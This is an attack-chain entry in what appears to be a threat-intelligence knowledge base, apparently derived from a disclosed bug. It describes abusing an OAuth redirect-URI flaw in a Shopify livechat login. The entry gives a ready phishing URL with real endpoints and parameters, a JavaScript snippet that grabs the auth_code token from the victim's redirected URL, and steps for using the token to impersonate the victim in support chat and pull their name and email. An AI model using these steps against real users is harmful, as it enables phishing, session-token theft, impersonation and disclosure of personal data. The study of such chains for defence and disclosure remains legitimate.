---
tags:
  - oauth
  - token-theft
  - impersonation
  - javascript-exfiltration
  - web-vulnerability
type: attack_chain
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Credential Access]]'
verified: false
platforms:
  - Web
  - Shopify
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Craft-Malicious-OAuth-Authentication-Link]]'
  - '[[procedures/Trick-Victim-into-Authorizing-Access]]'
  - '[[procedures/Extract-Access-Token-via-JavaScript-on-Attacker-Shop]]'
  - >-
    [[procedures/Impersonate-User-in-Livechat-and-Extract-Sensitive-Information]]
step_count: 4
techniques:
  - '[[T1566.002]]'
  - '[[Steal Application Access Token]]'
updated_at: '2025-12-14T17:25:17.832Z'
description: >-
  Exploits improper validation of OAuth redirect URIs in Shopify's livechat
  authentication to steal access tokens and impersonate users in support chats,
  disclosing sensitive information.
skill_level: intermediate
impact_level: high
id: 76a2e25f-2fea-45ea-8b6c-74e42f793317
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Credential Access]]'
mitre_techniques:
  - '[[T1566.002]]'
  - '[[Steal Application Access Token]]'
---
# Shopify OAuth Redirect URI Misconfiguration Leading to Livechat Token Theft and User Impersonation

Multi-stage attack chain demonstrating exploitation of improper OAuth redirect URI validation in Shopify's livechat authentication flow. An attacker crafts a malicious link to trick a victim into authorizing access, redirects them to an attacker-controlled Shopify shop to steal the access token via JavaScript, and then uses the token to impersonate the user in livechat, extracting sensitive details like email and full name.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 4 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Craft Malicious Link] --> B[Victim Authorizes Access]
    B --> C[Redirect to Attacker Shop]
    C --> D[Extract Token with JS]
    D --> E[Impersonate User and Exfil Data]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#9b59b6
    style E fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- Attacker-controlled Shopify shop
- Basic web development knowledge for JavaScript injection

### Target Environment

- Shopify platform with livechat enabled
- Victim's shop domain (e.g., victim.myshopify.com)
- Access to https://tasker-merchant-auth.herokuapp.com/auth/shopify/ endpoint

### Initial Access Requirements

- No prior credentials needed
- Ability to send phishing links to victims (e.g., via email or messaging)
- Network access to public internet for URL construction and redirection

## Detailed Attack Procedures

### Step 1: Craft Malicious Authentication Link
procedure: [[procedures/Craft-Malicious-OAuth-Authentication-Link]]

**Objective**: Create a phishing link that initiates OAuth with the victim's shop but redirects to the attacker's controlled shop post-authorization.

**Instructions**: Construct the malicious URL using the format: https://tasker-merchant-auth.herokuapp.com/auth/shopify/?utf8=%E2%9C%93&auth_type=chat&return_to=https://attacker-shop.myshopify.com/&shop=victim-shop.myshopify.com. Replace placeholders with actual shop domains. Send this link to the victim via email or other means.

**Expected Output**: Victim receives and clicks the link, starting the OAuth flow.

**Success Indicators**:
- Victim opens the link and sees the authorization prompt
- OAuth flow initiates with victim's shop domain

### Step 2: Victim Authorizes Access and Gets Redirected
procedure: [[procedures/Trick-Victim-into-Authorizing-Access]]

**Objective**: Social engineer the victim to grant access, resulting in redirection to the attacker's shop with the access token in the URL.

**Instructions**: If the victim hasn't authorized Shopify support before, they will be prompted to grant access. Upon approval, the flow redirects to https://attacker-shop.myshopify.com/?auth_code=<access_token>&auth_type=chat, appending the token as a query parameter.

**Expected Output**: Victim is redirected to the attacker's shop page with the auth_code visible in the URL.

**Success Indicators**:
- Authorization granted by victim
- URL contains auth_code parameter

### Step 3: Extract Access Token Using JavaScript on Attacker's Shop
procedure: [[procedures/Extract-Access-Token-via-JavaScript-on-Attacker-Shop]]

**Objective**: Use embedded JavaScript on the attacker's shop to parse and capture the access token from the URL.

**Instructions**: Ensure the attacker's shop page includes JavaScript to extract the token: var token = window.location.search.match(/auth_code=([^&]+)/); if(token && token.length > 1){ alert("Your access token is: " + token[1]); document.write("Attacker can use it to chat with support agents as you and he will be able to get your email <br> <b>Go to https://livechat.shopify.com/customer/chats/new?auth_type=chat&auth_code=" + token[1]); }. When the victim loads the page, the script runs, alerting and writing the token to the DOM for attacker capture (e.g., via logging or remote endpoint).

**Expected Output**: Token is extracted and displayed/alerted on the page.

**Success Indicators**:
- JavaScript executes and captures auth_code
- Token value is available for use

### Step 4: Use Stolen Token to Impersonate User in Livechat and Extract Info
procedure: [[procedures/Impersonate-User-in-Livechat-and-Extract-Sensitive-Information]]

**Objective**: Leverage the stolen token to access livechat as the victim and scrape sensitive user data from the page source.

**Instructions**: Navigate to https://livechat.shopify.com/customer/chats/new?auth_code=<access_token>&auth_type=chat using the stolen token. Once logged in as the victim, inspect the page source for JavaScript variables like var chat = new TC.CustomerChat({ chat:{"id":"<id>","token":"<chat_token>","name":"<user_first_and_last_name>","email":"<user_email>","metadata":"<other_meta_data>"}, ... }); Extract the name and email from the chat object.

**Expected Output**: Access to livechat interface as victim; sensitive data visible in source.

**Success Indicators**:
- Successful login to livechat using token
- User email and name extracted from JS object

## Attack Chain Summary

### Key Achievements

1. Bypassed OAuth redirect validation to steal livechat access tokens
2. Impersonated victim in support chats without direct credentials
3. Disclosed sensitive PII like email and full name via page source inspection

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[T1566.002]] Spearphishing Link
- [[Steal Application Access Token]] Steal Application Access Token

### MITRE ATT&CK Tactics

- [[Initial Access]] Initial Access
- [[Credential Access]] Credential Access

---
*Last updated: 2023-10-01T00:00:00Z*
